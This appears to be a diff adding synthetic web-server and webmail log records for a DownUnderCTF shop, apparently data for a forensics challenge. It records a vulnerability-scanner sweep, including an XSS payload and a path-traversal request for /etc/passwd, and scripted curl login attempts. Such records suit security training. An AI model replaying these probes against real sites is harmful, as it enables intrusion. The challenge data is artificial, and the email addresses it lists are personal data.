+    "url": "shop.downunderctf.com/wp-content/uploads/simple-file-list/nuclei.php",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:13.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/CFIDE/administrator/enter.cfm",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:14.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/cgi-bin/test/test.cgi",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:15.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/favicon.ico",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:16.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/nuclei.txt",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:17.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/wp-content/plugins/elementor/",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:18.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/zp-core/setup/index.php",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:19.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/wp-content/plugins/gtranslate/",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:20.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/include/nuclei.txt",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:21.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/pandora_console/mobile/",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:22.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/install.php",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:23.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/api/v4/projects",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:24.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/signup",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:25.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/metrics",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:26.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/MyErrors.log",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:27.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/error.log",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:28.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/npm-debug.log",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:29.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/production.log",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:30.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/plugin/build-metrics/getBuildStats?label=%22%3E%3Csvg%2Fonload%3Dalert(1337)%3E&range=2&rangeUnits=Weeks&jobFilteringType=ALL&jobFilter=&nodeFilteringType=ALL&nodeFilter=&launcherFilteringType=ALL&launcherFilter=&causeFilteringType=ALL&causeFilter=&Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7B%22label%22%3A+%22Search+Results%22%2C+%22range%22%3A+%222%22%2C+%22rangeUnits%22%3A+%22Weeks%22%2C+%22jobFilteringType%22%3A+%22ALL%22%2C+%22jobNameRegex%22%3A+%22%22%2C+%22jobFilter%22%3A+%22%22%2C+%22nodeFilteringType%22%3A+%22ALL%22%2C+%22nodeNameRegex%22%3A+%22%22%2C+%22nodeFilter%22%3A+%22%22%2C+%22launcherFilteringType%22%3A+%22ALL%22%2C+%22launcherNameRegex%22%3A+%22%22%2C+%22launcherFilter%22%3A+%22%22%2C+%22causeFilteringType%22%3A+%22ALL%22%2C+%22causeNameRegex%22%3A+%22%22%2C+%22causeFilter%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7D&Submit=Search",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:31.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/LetsEncrypt/Index?fileName=/etc/passwd",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:01:32.000+0000",
+    "origin": "194.163.140.128",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+    "url": "shop.downunderctf.com/phpmyadmin/",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:50:29.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "cliffski@live.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "shop.downunderctf.com - Order#726",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:45:21.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "rddesign@icloud.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "Thank you for registering your shop.downunderctf.com account",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:50:29.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "rddesign@icloud.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "shop.downunderctf.com - Order#725",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:35:50.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "staikos@gmail.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "Thank you for registering your shop.downunderctf.com account",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:09:37.000+0000",
+    "origin": "1.44.113.229",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=7",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.33.2 (KHTML, like Gecko) Version/4.0.1 Safari/532.33.2",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:09:47.000+0000",
+    "origin": "1.44.113.229",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.33.2 (KHTML, like Gecko) Version/4.0.1 Safari/532.33.2",
+    "url": "shop.downunderctf.com/product?id=8",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:10:12.000+0000",
+    "origin": "1.44.113.229",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/product?id=8",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.33.2 (KHTML, like Gecko) Version/4.0.1 Safari/532.33.2",
+    "url": "shop.downunderctf.com/product?id=8",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:10:17.000+0000",
+    "origin": "1.44.113.229",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=8",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.33.2 (KHTML, like Gecko) Version/4.0.1 Safari/532.33.2",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:10:19.000+0000",
+    "origin": "1.44.113.229",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.33.2 (KHTML, like Gecko) Version/4.0.1 Safari/532.33.2",
+    "url": "shop.downunderctf.com/product?id=9",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:11:44.000+0000",
+    "origin": "1.44.113.229",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=9",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.33.2 (KHTML, like Gecko) Version/4.0.1 Safari/532.33.2",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:12:00.000+0000",
+    "origin": "1.44.113.229",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.33.2 (KHTML, like Gecko) Version/4.0.1 Safari/532.33.2",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:12:56.000+0000",
+    "origin": "1.44.113.229",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.33.2 (KHTML, like Gecko) Version/4.0.1 Safari/532.33.2",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:13:27.000+0000",
+    "origin": "1.44.113.229",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.33.2 (KHTML, like Gecko) Version/4.0.1 Safari/532.33.2",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:13:52.000+0000",
+    "origin": "1.44.113.229",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.33.2 (KHTML, like Gecko) Version/4.0.1 Safari/532.33.2",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:13:57.000+0000",
+    "origin": "1.44.113.229",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.33.2 (KHTML, like Gecko) Version/4.0.1 Safari/532.33.2",
+    "url": "shop.downunderctf.com/orderconfirm",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:34:17.000+0000",
+    "origin": "1.44.75.32",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "downunderctf.com",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.0; Trident/5.1)",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:34:23.000+0000",
+    "origin": "1.44.75.32",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.0; Trident/5.1)",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:34:46.000+0000",
+    "origin": "1.44.75.32",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.0; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=8",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:34:57.000+0000",
+    "origin": "1.44.75.32",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=8",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.0; Trident/5.1)",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:35:09.000+0000",
+    "origin": "1.44.75.32",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.0; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=4",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:27:11.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "google.com/search?hl=en&q=ducktf%20shop",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:27:39.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:28:18.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:28:21.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:04.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:04.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:05.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:45.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "null",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:51.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:15:27.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/account",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:05:15.000+0000",
+    "origin": "125.168.15.92",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:05:33.000+0000",
+    "origin": "125.168.15.92",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:05:49.000+0000",
+    "origin": "125.168.15.92",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:07:37.000+0000",
+    "origin": "203.35.133.169",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=7",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:09:58.000+0000",
+    "origin": "203.35.134.222",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "google.com/search?hl=en&q=hacker%20swag",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "url": "shop.downunderctf.com/product?id=1",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:10:16.000+0000",
+    "origin": "203.35.134.222",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=1",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:28:28.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:28:41.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com/product?id=3",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:28:42.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com/product?id=5",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:28:42.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com/product?id=6",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:28:43.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com/product?id=7",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:28:45.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com/product?id=8",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:29:24.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=3",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com/product?id=9",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:29:56.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/product?id=9",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com/product?id=9",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:30:13.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=9",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:30:22.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com/product?id=2",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:30:39.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/product?id=2",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com/product?id=2",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:30:48.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=2",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:31:14.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:31:18.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com/orderconfirm",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:31:26.000+0000",
+    "origin": "106.69.91.198",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/orderconfirm",
+    "useragent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7) AppleWebKit/5310 (KHTML, like Gecko) Chrome/40.0.806.0 Mobile Safari/5310",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:21:16.000+0000",
